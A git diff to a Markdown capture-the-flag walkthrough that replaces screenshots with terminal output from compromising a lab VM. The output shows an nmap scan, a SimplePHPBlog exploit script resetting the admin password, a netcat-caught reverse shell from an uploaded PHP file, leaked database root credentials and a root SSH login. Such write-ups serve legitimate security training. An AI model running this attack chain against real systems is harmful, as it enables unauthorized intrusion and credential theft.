@@ -38,8 +38,33 @@ some scans on this ip.
 
 First, [Nmap scanner](https://github.com/nmap/nmap) is used to find all the open ports and services running. 
 
-![nmap](images/0.png)
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap -sC -T4 -A 10.10.10.100 
+Starting Nmap 7.91 ( https://nmap.org) at 2021-06-26 16:01 EDT 
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system
+dns or specify valid servers with -- dns-servers 
+Nmap scan report for 10.10.10.100 
+Host is up (0.00185 latency). 
+Not shown: 998 closed ports 
+PORT   STATE SERVICE VERSION 
+22/tcp open  ssh     OpenSSH 5.8p1 Debian lubuntu3 (Ubuntu Linux; protocol 2.0) 
+|  ssh-hostkey:
+|	 1024 85:03:26:01:09:42:7b:20:48:30:03:60:01:8f:95:ff (DSA) 
+|	 2048 30:72:31:9a:1b:b8:17:07:15:df:89:92:0e:cd:58:28 (RSA)
+|	 256 10:12:54:46:7d:ff:6a:87:37:26:38:51:44:9f:cf:5e (ECDSA) 
+80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu)
+|  http-cookie-flags:
+|	/:
+|	  PHPSESSID:
+|		httponly flag not set 
+|_http-server-header: Apache/2.2.17 (Ubuntu) 
+|_http-title: Welcome to this site! 
+Service Info: OS: Linux; CPE: cpe:70:linux:linux kernel
 
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.48 seconds
+```
 From this scan, we can see that port 22 and 80 are open. **SSH** service is running on port 22
 and an **Apache** server is open on port 80. 
 <br>
@@ -201,11 +226,27 @@ They have also mentioned the instructions for using the script
 So we download this script and execute it using the command below to add a username and password of our choice
 
 ```bash
-perl 1191.pl -h http://10.10.10.100/blog -e 3 -U agent47 -P agent47
+┌──(kali㉿kali)-[~/Downloads]
+└─$ perl 1191.pl -h http://10.10.10.100/blog -e 3 -U agent47 -P agent47
+
+
+                  SimplePHPBlog v0.4.0 Exploits
+                             by
+                     Kenneth F. Belva, CISSP
+                    http://www.ftusecurity.com
+________________________________________________________________________________
+Running Set New Username and Password Exploit....
+
+
+Deleted File: ./config/password.txt
+./config/password.txt created!
+Username is set to: agent47
+Password is set to: agent47
+
+
+*** Exploit Completed....
+Have a nice day! :)
 ```
-
-![exploit](images/7.png)
-
 Now after adding the username and password, we can login to the blog with those credentials.
 
 And when we login,
@@ -234,24 +275,93 @@ Now we can set up a **netcat** listener on our machine and open the **reverse.ph
 like the one below:
 
 ```bash
-nc -lvnp 1234
+┌──(kali㉿kali)-[~]
+└─$ nc -lvp 1234
+listening on [any] 1234 ...
+10.10.10.100: inverse host lookup failed: Host name lookup failure
+connect to [10.10.10.101] from (UNKNOWN) [10.10.10.100] 59470
+Linux web 2.6.38-8-server #42-Ubuntu SMP Mon Apr 11 03:49:04 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux
+ 22:06:21 up  3:39,  0 users,  load average: 0.00, 0.01, 0.01
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: can't access tty; job control turned off
+$
 ```
-
-![rev-shell](images/12.png)
 
 When we list the directory we can find a var folder and then when we list the contents in the
 var directory,
 
-![var-dir](images/13.png)
+```bash
+$ cd var
+$ ls
+backups
+cache
+crash
+index.html
+lib
+local
+lock
+log
+mail
+mysqli_connect.php
+opt
+run
+spool
+tmp
+uploads
+www
+$
+```
 
 There was something odd in this directory. A **mysqli_connect.php** file was present in the var directory itself. It might be indicating something. 
 So when we display the file **mysqli_connect.php**, we get a username and a password
 
-![mysqli-connect](images/14.png)
+```bash
+$ cat mysqli_connect.php
+<?php # Script 8.2 - mysqli_connect.php
+
+// This file contains the database access information.
+// This file also establishes a connection to MySQL
+// and selects the database.
+
+// Set the database access information as constants:
+
+DEFINE ('DB_USER', 'root');
+DEFINE ('DB_PASSWORD', 'root@ISIntS');
+DEFINE ('DB_HOST', 'localhost');
+DEFINE ('DB_NAME', 'ch16');
+
+// Make the connection:
+
+$dbc = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) OR die ('Could not connect to MySQL: ' . mysqli_connect_error() );
+
+?>$
+```
 
 As there was an **SSH** service running in this machine, we try to login with these root credentials.
 
-![ssh-login](images/15.png)
+```bash
+┌──(kali㉿kali)-[~]
+└─$ ssh root@10.10.10.100
+root@10.10.10.100's password: 
+Welcome to Ubuntu 11.04 (GNU/Linux 2.6.38-8-server x86_64)
+
+ * Documentation:  http://www.ubuntu.com/server/doc
+
+  System information as of Sun May 2 01:07:49 EDT 2021
+
+  System load:  0.0               Processes:           78
+  Usage of /:   2.9% of 38.64GB   Users logged in:     0
+  Memory usage: 18%               IP address for eth0: 10.10.10.100
+  Swap usage:   0%
+
+  Graph this data and manage this system at https://landscape.canonical.com/
+Last login: Sat May  1 19:01:15 2021 from 10.10.10.101
+root@web:~# 
+root@web:~# whoami
+root
+root@web:~#
+```
 
 Finally, root access is acquired <3
 
